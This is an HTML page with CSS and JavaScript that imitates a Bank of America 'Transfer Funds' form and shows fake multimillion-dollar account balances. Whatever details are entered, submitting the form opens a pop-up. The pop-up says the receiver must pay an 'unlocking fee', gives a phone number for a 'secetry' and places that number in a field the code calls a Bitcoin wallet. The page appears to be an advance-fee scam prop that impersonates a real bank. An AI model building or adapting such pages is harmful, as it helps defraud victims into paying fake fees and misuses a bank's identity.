<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transfer Funds - Bank of America</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #F0F2F5;
            color: #333;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Align to top */
            min-height: 100vh;
            box-sizing: border-box;
        }

        .transfer-container {
            background-color: #FFFFFF;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 550px; /* Wider for forms */
            box-sizing: border-box;
            position: relative;
        }

        h2 {
            color: #2F3D61;
            margin-top: 0;
            margin-bottom: 30px;
            text-align: center;
            font-size: 1.8em;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: bold;
            font-size: 0.9em;
        }

        .form-group input[type="text"],
        .form-group input[type="number"],
        .form-group select {
            width: 100%;
            padding: 12px;
            border: 1px solid #DDDDDD;
            border-radius: 5px;
            font-size: 1em;
            box-sizing: border-box;
            background-color: #FFFFFF; /* Ensure white background for select */
            -webkit-appearance: none; /* Remove default arrow on select */
            -moz-appearance: none;
            appearance: none;
            background-image: url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23000000%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-24.8%200L146.2%20185.6%2030.6%2069.4a17.6%2017.6%200%200%200-24.8%2024.8l130.4%20130.5c6.8%206.8%2017.7%206.8%2024.5%200l130.5-130.5a17.6%2017.6%200%200%200%200-24.8z%22%2F%3E%3C%2Fsvg%3E');
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 12px;
        }

        .form-group input:focus,
        .form-group select:focus {
            border-color: #CC0000;
            outline: none;
            box-shadow: 0 0 0 2px rgba(204, 0, 0, 0.2);
        }

        .transfer-button {
            background-color: #CC0000;
            color: #FFFFFF;
            padding: 12px 25px;
            border: none;
            border-radius: 5px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s ease;
            margin-top: 20px;
        }

        .transfer-button:hover {
            background-color: #A30000;
        }

        /* --- Custom Pop-up (Modal) Styling --- */
        .modal {
            display: none; /* Hidden by default */
            position: fixed; /* Stay in place */
            z-index: 1001; /* Sit on top */
            left: 0;
            top: 0;
            width: 100%; /* Full width */
            height: 100%; /* Full height */
            overflow: auto; /* Enable scroll if needed */
            background-color: rgba(0,0,0,0.6); /* Black w/ opacity */
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: #fefefe;
            margin: auto;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 90%;
            text-align: center;
            color: #333;
            animation: fadeInModal 0.3s ease-out;
        }

        .modal-content h3 {
            color: #CC0000;
            margin-top: 0;
            margin-bottom: 20px;
            font-size: 1.5em;
        }

        .modal-content p {
            font-size: 1.1em;
            margin-bottom: 25px;
        }

        .btc-wallet-address {
            background-color: #F8F8F8;
            border: 1px solid #eee;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace; /* Monospaced font for code/address */
            font-size: 1em;
            color: #2F3D61;
            word-break: break-all; /* Break long words */
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .btc-wallet-address span {
            flex-grow: 1;
            text-align: left;
        }

        .copy-button {
            background-color: #007BFF; /* Blue for copy */
            color: white;
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9em;
            margin-left: 10px;
            transition: background-color 0.3s ease;
        }

        .copy-button:hover {
            background-color: #0056b3;
        }

        .modal-close-button {
            background-color: #6c757d; /* Grey */
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s ease;
        }

        .modal-close-button:hover {
            background-color: #5a6268;
        }

        /* Animations */
        @keyframes fadeInModal {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Responsive adjustments */
        @media (max-width: 600px) {
            .transfer-container {
                padding: 20px;
                margin: 10px;
            }
            h2 {
                font-size: 1.5em;
            }
            .form-group input, .form-group select {
                padding: 10px;
            }
            .transfer-button {
                padding: 10px 20px;
                font-size: 1em;
            }
            .modal-content {
                padding: 20px;
            }
            .modal-content h3 {
                font-size: 1.3em;
            }
            .modal-content p {
                font-size: 1em;
            }
        }
    </style>
</head>
<body>
    <div class="transfer-container">
        <h2>Transfer Funds</h2>
        <form id="transferForm">
            <div class="form-group">
                <label for="fromAccount">From Account:</label>
                <select id="fromAccount" name="fromAccount" required>
                    <option value="">Select Account</option>
                    <option value="checking">Checking Account ($50,234,507.56)</option>
                    <option value="savings">Savings Account ($5,089,678.90)</option>
                </select>
            </div>

            <div class="form-group">
                <label for="recipientName">Recipient Name:</label>
                <input type="text" id="recipientName" name="recipientName" placeholder="" required>
            </div>

            <div class="form-group">
                <label for="recipientBank">Recipient Bank:</label>
                <select id="recipientBank" name="recipientBank" required>
                    <option value="">Select Bank</option>
                    <option value="bank_of_america" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Bank_of_America_logo.svg/80px-Bank_of_America_logo.svg.png">Bank of America</option>
                    <option value="chase" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/JPMorgan_Chase_%26_Co_logo_2008.svg/80px-JPMorgan_Chase_%26_Co_logo_2008.svg.png">Chase</option>
                    <option value="wells_fargo" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Wells_Fargo_logo.svg/80px-Wells_Fargo_logo.svg.png">Wells Fargo</option>
                    <option value="citibank" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Citibank_logo.svg/80px-Citibank_logo.svg.png">Citibank</option>
                    <option value="us_bank" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/U.S._Bank_logo.svg/80px-U.S._Bank_logo.svg.png">U.S. Bank</option>
                    <option value="pnc" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/PNC_Bank_logo.svg/80px-PNC_Bank_logo.svg.png">PNC Bank</option>
                    <option value="capital_one" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Capital_One_logo.svg/80px-Capital_One_logo.svg.png">Capital One</option>
                    <option value="truist" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Truist_Financial_logo.svg/80px-Truist_Financial_logo.svg.png">Truist</option>
                    <option value="td_bank" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/TD_Bank_logo.svg/80px-TD_Bank_logo.svg.png">TD Bank</option>
                    <option value="discover" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f9/Discover_Card_logo.svg/80px-Discover_Card_logo.svg.png">Discover Bank</option>
                    </select>
                <div id="bankLogoDisplay" style="margin-top: 10px; text-align: left; display: none;">
                    <img id="selectedBankLogo" src="" alt="Bank Logo" style="width: 50px; height: auto;">
                </div>
            </div>

            <div class="form-group">
                <label for="accountNumber">Recipient Account Number:</label>
                <input type="text" id="accountNumber" name="accountNumber" placeholder="e.g., 123456789" required>
            </div>

            <div class="form-group">
                <label for="transferAmount">Amount:</label>
                <input type="number" id="transferAmount" name="transferAmount" placeholder="e.g., 500.00" step="0.01" min="0.01" required>
            </div>

            <button type="submit" class="transfer-button">Initiate Transfer</button>
        </form>
    </div>

    <div id="serviceFeeModal" class="modal">
        <div class="modal-content">
            <h3>Oops, Service Fee Required!</h3>
            <p>The receiver need to clear the unlocking fee to receive the payment</p>
            <p>Contact secetry direct mobile number only +1 904-504-6310</p>
            <div class="btc-wallet-address">
                <span id="bitcoinWalletAddress">+1 904-504-6310</span>
                <button class="copy-button" onclick="copyWalletAddress()">Copy</button>
            </div>
            <button class="modal-close-button" onclick="closeModal()">Close</button>
        </div>
    </div>

    <script>
        const bitcoinWallet = "+19045046310"; // Example BTC wallet address

        document.getElementById('transferForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Stop the form from submitting normally

            // In a real app, you'd perform validations here
            // For now, we'll just trigger the pop-up
            openModal();
        });

        // Function to handle bank logo display on select change
        document.getElementById('recipientBank').addEventListener('change', function() {
            const selectedOption = this.options[this.selectedIndex];
            const logoUrl = selectedOption.dataset.logo;
            const bankLogoDisplay = document.getElementById('bankLogoDisplay');
            const selectedBankLogo = document.getElementById('selectedBankLogo');

            if (logoUrl) {
                selectedBankLogo.src = logoUrl;
                bankLogoDisplay.style.display = 'block';
            } else {
                bankLogoDisplay.style.display = 'none';
                selectedBankLogo.src = ''; // Clear source
            }
        });


        function openModal() {
            document.getElementById('serviceFeeModal').style.display = 'flex'; // Use flex to center
            document.getElementById('bitcoinWalletAddress').textContent = bitcoinWallet; // Ensure wallet address is set
        }

        function closeModal() {
            document.getElementById('serviceFeeModal').style.display = 'none';
        }

        function copyWalletAddress() {
            const walletAddress = document.getElementById('bitcoinWalletAddress').textContent;
            navigator.clipboard.writeText(walletAddress).then(() => {
                const copyButton = document.querySelector('.copy-button');
                const originalText = copyButton.textContent;
                copyButton.textContent = 'Copied!';
                copyButton.style.backgroundColor = '#28a745'; // Green for copied

                setTimeout(() => {
                    copyButton.textContent = originalText;
                    copyButton.style.backgroundColor = '#007BFF'; // Revert to original color
                }, 1500); // Revert after 1.5 seconds
            }).catch(err => {
                console.error('Failed to copy text: ', err);
                alert('Failed to copy address. Please copy it manually.');
            });
        }
    </script>
</body>
</html>
